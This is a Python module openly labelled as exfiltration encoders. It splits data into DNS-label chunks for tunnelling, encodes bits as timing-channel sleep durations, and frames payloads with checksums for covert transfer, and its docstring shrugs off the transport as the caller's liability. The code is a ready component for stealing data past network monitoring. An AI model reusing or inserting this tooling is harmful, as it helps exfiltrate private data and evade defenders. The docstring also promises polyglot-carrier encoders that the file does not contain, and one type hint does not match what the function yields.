"""
Exfiltration encoders — data -> DNS-label-safe, timing-channel, and
polyglot-carrier representations. Pure encoding; transport is the caller's
responsibility (and liability).
"""
from __future__ import annotations

import base64
import hashlib
import struct
import time
from dataclasses import dataclass
from typing import Iterator, List


def dns_chunks(data: bytes, label_len: int = 63, prefix: str = "x") -> List[str]:
    """Split data into DNS-safe base32 labels."""
    b32 = base64.b32encode(data).decode().rstrip("=")
    return [f"{prefix}{i:04d}-{b32[i:i+label_len]}"
            for i in range(0, len(b32), label_len)]


def dns_reassemble(labels: List[str]) -> bytes:
    b32 = "".join(l.split("-", 1)[1] for l in sorted(labels, key=lambda s: s.split("-")[0]))
    pad = (-len(b32)) % 8
    return base64.b32decode(b32 + "=" * pad)


def timing_encode_bits(data: bytes, slot_ns: int) -> Iterator[float]:
    """Yield (value, duration) tuples: sleep patterns a timing receiver decodes."""
    bits = []
    for b in data:
        bits.extend((b >> i) & 1 for i in range(7, -1, -1))
    for bit in bits:
        yield bit, slot_ns * (3 if bit else 1)


@dataclass
class ExfilFrame:
    seq: int
    total: int
    payload: bytes
    checksum: str


def frame_stream(data: bytes, chunk_size: int = 180) -> List[ExfilFrame]:
    chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)] or [b""]
    total = len(chunks)
    frames = []
    for seq, c in enumerate(chunks):
        frames.append(ExfilFrame(seq, total, c, hashlib.sha256(c).hexdigest()[:8]))
    return frames


def serialize_frame(f: ExfilFrame) -> bytes:
    return struct.pack(">HH", f.seq, f.total) + bytes.fromhex(f.checksum) + f.payload
